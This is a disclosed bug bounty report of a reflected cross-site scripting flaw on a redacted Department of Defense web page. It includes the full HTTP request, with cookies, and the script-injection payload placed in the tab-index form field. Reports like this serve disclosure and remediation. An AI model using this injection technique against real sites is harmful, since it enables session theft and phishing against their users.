# [████████] Reflected XSS

## Report Details
- **Report ID**: 499041
- **URL**: https://hackerone.com/reports/499041
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-02-21T08:40:06.448Z
- **Disclosed**: 2019-12-02T19:12:43.215Z

## Reporter
- **Username**: jarvis0x1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi!

I found reflected XSS in ███. This was due to the fact that the page did not have the necessary filtering of incoming parameters.

Request

```
POST /█████/Directorate-of-Human-Resources/ HTTP/1.1
Content-Length: 4643
Content-Type: multipart/form-data; boundary=-----Boundary_UXGIMHUKLO
Referer: https://www.███
Cookie: dnn_IsMobile=False; language=en-US; ARRAffinity=dd6af558f7714238fe3a80d1f60c5b7b7bcaf5d0c29fbd88bf296cdd796f82e9; .ASPXANONYMOUS=KvLj_KVA-RarHC_K1kRBz9iUW35Ibgh33OSvMCtKaZisl4PgXIAf7cKQM0fsr7KOJbNkuEIDI46ZYj-HxWpYAIMZ2vJXWbEZMO9B4rAo3Vb6qcZh0; ahoy_visit=38af441f-31f2-4b89-a968-586c5de67938; ahoy_visitor=b81ca8a8-dfd6-4fd8-90ad-82f5867b334c; ImageGalleryBackUrl=https://www.█████/MEDIA/IMAGERY/; ahoy_events=%5B%5D
Host: www.███████
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="desktopSearch"


-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="dnn$ctr5099$ViewTabs$hidCurrentTabIndex"

11111111'; prompt(1); a='
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="mobileSearch"

987-65-4329
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="ScriptManager_TSM"

1
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="ScrollTop"

1
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="StylesheetManager_TSSM"

1
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="__dnnVariable"

`{`__scdoff`:`1`}
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="__EVENTARGUMENT"

1
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="__EVENTTARGET"

1
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="__EVENTVALIDATION"

abOunaiP3zQxJsrrS+NmGHY0s/Umn6TO7GPEX5nkA8rg1kfwnYivgnOZ1jV6N7bvyKy9ysb8CJVECJZ6zfTcKnGTOXJ96IUiV9lkIaOaBCsnI+FCIoX+B84r8aPtYuSxQWmzUA==
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="__VIEWSTATE"

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
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="__VIEWSTATEENCRYPTED"

1
-------Boundary_UXGIMHUKLO
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

CA0B0334
-------Boundary_UXGIMHUKLO--

```

Vulnerable param is ```dnn$ctr5099$ViewTabs$hidCurrentTabIndex``` and payload is 

```
11111111'; prompt(1); a='
```

Response:
███████

How it work:
███████

## Impact

XSS allow hacker to steal user session (cookies). Also XSS allow complete phishing attack. Also XSS allow done some action in account.

## Attachments
No attachments
